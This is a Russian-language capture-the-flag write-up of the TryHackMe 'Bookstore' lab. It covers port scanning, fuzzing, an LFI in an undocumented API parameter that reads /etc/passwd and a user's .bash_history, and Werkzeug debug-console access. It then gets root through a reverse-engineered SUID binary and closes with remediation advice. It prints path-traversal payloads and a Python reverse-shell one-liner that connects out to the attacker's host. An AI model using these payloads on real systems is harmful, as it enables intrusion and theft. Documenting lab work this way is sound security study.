# TryHackMe - Bookstore

## 1. Reconnaissance (Разведка)

Первым шагом было сканирование портов с помощью **RustScan** для определения периметра атаки.

```bash
rustscan -a 10.66.190.179 -- -sV
```
**Результат:** Обнаружены открытые порты 22 (SSH), 80 (HTTP) и 5000 (HTTP).
![Запуск rustscan](Screens/Bookstore_Recon_1.png)
![Открытые порты](Screens/Bookstore_Recon_2.png)

На порту 80 запущен веб-сервер Apache 2.4.29.

![Веб-сервер Apache](Screens/Bookstore_80.png)

Из себя он не представляет ничего интересного.

Также на порту 5000 запущен веб-сервер Werkzeug 0.14.1.

![Веб-сервер Werkzeug](Screens/Bookstore_5000.png)

Был запущен перебор файлов и директорий через **FFUF**:

```bash
ffuf -w wordlist/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://10.66.190.179:5000/FUZZ -e .php,.html,.txt
```

![Перебор файлов и директорий](Screens/Bookstore_Fuzz.png)

**Результат:** Обнаружены директории /api и /console.

Перейдя на /console - видим Werkzeug Debug Console требующий ввести PIN

![Требование ввести PIN](Screens/Bookstore_Debug_Console_PIN.png)

## 2. Initial Access (Первоначальный доступ)

Перейдя по адресу /api/, была обнаружена API документация, указывающая на некоторые возможности с данным API.

![API документация](Screens/Bookstore_API_Documentation.png)

Также было замечено, что тут работает не только V2, но и V1 версия.

![API V1](Screens/Bookstore_API_V1.png)

Был запущен перебор параметров через **FFUF**:

```bash
ffuf -w wordlist/SecLists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://10.66.190.179:5000/api/v1/resources/books?FUZZ=123'
```

![Перебор параметров](Screens/Bookstore_API_Fuzz.png)

**Результат:** Обнаружен незадокументированный параметр `show`.

Использовав этот параметр видим ошибку `NameError: name 'filename' is not defined`, подсказывающая, что значение параметра это название файлов в системе

![Проверка параметра](Screens/Bookstore_Test_Param.png)

Данный параметр уязвим к LFI: 

```bash
/api/v1/resources/books?show=../../../../../../etc/passwd
```

![LFI](Screens/Bookstore_LFI.png)

Отсюда сразу видим пользователя `sid`.

## 3. Foothold (Закрепление)

Прочитав через найденную уязвимость файл .bash_history данного пользователя, можно увидеть PIN необходимый для Werkzeug.

```bash
/api/v1/resources/books?show=../../../../../../home/sid/.bash_history
```

![Чтение .bash_history](Screens/Bookstore_Read_Bash_History.png)

Введя данный PIN - удалось попасть в саму консоль.

![Успешный вход в консоль](Screens/Bookstore_Console.png)

Данная консоль исполняет произвольный Python код. Это было использовано для отправки Reverse Shell.

```bash
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[local ip]",444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```

![Отправка Reverse Shell](Screens/Bookstore_Rev_Shell_Send.png)
![Получение Reverse Shell](Screens/Bookstore_Rev_Shell_Get.png)

Следом был прочитан User флаг.

![User флаг](Screens/Bookstore_User_Flag.png)

## 4. Privilege Escalation (Повышение привилегий)

В корневой директории текущего пользователя находится исполняемый файл try-harder, выполнив его он запрашивает секретное число `What's The Magic Number?!`.

![Исполняемый файл](Screens/Bookstore_Executable_File.png)

Перенеся данный файл к себе и проанализировав его через **Ghidra** удалось обнаружить код отвечающий за данное число.

![Отправка файл](Screens/Bookstore_Send_File_1.png)
![Получение файла](Screens/Bookstore_Send_File_2.png)
![Открытие файла в Ghidra](Screens/Bookstore_Ghidra_1.png)
![Анализ в Ghidra](Screens/Bookstore_Ghidra_2.png)
![Поиск по слову в Ghidra](Screens/Bookstore_Ghidra_3.png)

Чтобы вычислить секретное число, был использован LLM (ChatGPT) как ассистента для написания обратного скрипта. Данный скрипт был исполнен локально.

![Запрос к ChatGPT](Screens/Bookstore_ChatGPT_1.png)
![Ответ к ChatGPT](Screens/Bookstore_ChatGPT_2.png)
![Исполнение кода для вычисления числа](Screens/Bookstore_Execute_Python.png)

Вернувшись в Reverse Shell и запустив снова скрипт - полученное число подошло и получили пользователя `root`.

![Получение Root](Screens/Bookstore_Get_Root.png)

Далее был прочитан финальный флаг:

![Получение Root флага](Screens/Bookstore_Root_Flag.png)

## Remediation (Рекомендации по устранению)

Для предотвращения подобных атак необходимо:

1. **Безопасность API:** Никогда не передавать пользовательский ввод напрямую в функции работы с файлами (защита от Path Traversal/LFI). Использовать строгую валидацию параметров (например, разрешать только числовые ID).
2. **Конфигурация сервера:** Отключить режим отладки (Debug Mode). Никогда не оставлять открытыми консоли разработчика (Werkzeug Debugger), так как это приводит к прямому RCE.
3. **Управление секретами:** Не хранить пароли, PIN-коды и другие чувствительные данные в файлах истории bash (.bash_history) или конфигурационных файлах в открытом виде.
4. **Права доступа:** Удалить SUID-бит с нестандартных исполняемых файлов. Принцип наименьших привилегий (Least Privilege) должен соблюдаться строго.